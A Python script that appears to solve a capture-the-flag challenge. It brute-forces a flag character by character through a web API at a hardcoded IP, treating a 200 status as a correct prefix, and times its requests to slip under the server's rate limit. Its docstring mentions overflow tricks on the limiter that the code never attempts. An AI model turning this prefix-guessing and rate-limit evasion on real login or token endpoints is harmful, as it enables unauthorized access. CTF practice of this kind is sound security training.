#!/usr/bin/env python3
"""
Smart approach: Wait for rate limit to reset, then carefully brute force
Also try exploiting the rate limit itself (negative values, overflow, etc.)
"""

import requests
import string
import time

url = "http://23.179.17.92:5559"
api_url = f"{url}/api/flag"

print("="*70)
print("HIT YOUR LIMIT - SMART SOLVER")
print("="*70)

# Check current rate limit status
print("\n[*] Checking rate limit status...")
r = requests.get(api_url, params={'guess': 'test'}, timeout=10)
print(f"    Status: {r.status_code}")
if r.status_code == 429:
    data = r.json()
    wait_time = data.get('message', '').split('Retry in ')[1].split('s')[0] if 'Retry in' in data.get('message', '') else '0'
    print(f"    Need to wait: {wait_time} seconds")
    print(f"    Requests made: {data.get('requests', 'unknown')}")
    print(f"\n[*] Waiting for rate limit to reset...")
    time.sleep(int(wait_time) + 5)

# Now try with limited requests
FLAG_LENGTH = 32
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_'

known_flag = "CIT{"
request_count = 0
MAX_REQUESTS = 4  # Stay under the limit of 5

print(f"\n[*] Starting careful brute force from: {known_flag}")
print(f"[*] Using max {MAX_REQUESTS} requests per character")

while len(known_flag) < FLAG_LENGTH and request_count < 100:
    print(f"\n[*] Current: {known_flag} ({len(known_flag)}/{FLAG_LENGTH})")
    found = False
    
    # Try most common characters first
    common_chars = 'etaoinshrdlu_ETAOINSHRDLU0123456789'
    test_chars = common_chars + ''.join(c for c in charset if c not in common_chars)
    
    for i, char in enumerate(test_chars):
        if request_count >= MAX_REQUESTS:
            print(f"    [!] Reached request limit, waiting 120s...")
            time.sleep(120)
            request_count = 0
        
        guess = known_flag + char
        
        try:
            r = requests.get(api_url, params={'guess': guess}, timeout=10)
            request_count += 1
            
            print(f"    [{request_count}] Testing '{char}': Status {r.status_code}", end='')
            
            if r.status_code == 200:
                print(f" ✓")
                known_flag = guess
                found = True
                request_count = 0  # Reset after finding
                time.sleep(1)  # Wait a bit before next character
                break
            elif r.status_code == 429:
                print(f" - Rate limited!")
                data = r.json()
                wait_time = int(data.get('message', '').split('Retry in ')[1].split('s')[0]) if 'Retry in' in data.get('message', '') else 120
                print(f"    [!] Waiting {wait_time}s...")
                time.sleep(wait_time + 5)
                request_count = 0
                # Retry this character
                r = requests.get(api_url, params={'guess': guess}, timeout=10)
                if r.status_code == 200:
                    print(f"    [+] Found after wait: {char}")
                    known_flag = guess
                    found = True
                    break
            else:
                print(f" ✗")
                
        except Exception as e:
            print(f"\n    [!] Error: {e}")
            time.sleep(2)
    
    if not found:
        print(f"    [!] No character found in common set")
        # Try ending
        for ending in ['}']:
            guess = known_flag + ending
            r = requests.get(api_url, params={'guess': guess}, timeout=10)
            if r.status_code == 200:
                known_flag = guess
                found = True
                break
        
        if not found:
            print(f"    [!] Stuck at: {known_flag}")
            break

print(f"\n{'='*70}")
print(f"[!!!] FINAL FLAG: {known_flag}")
print(f"{'='*70}")
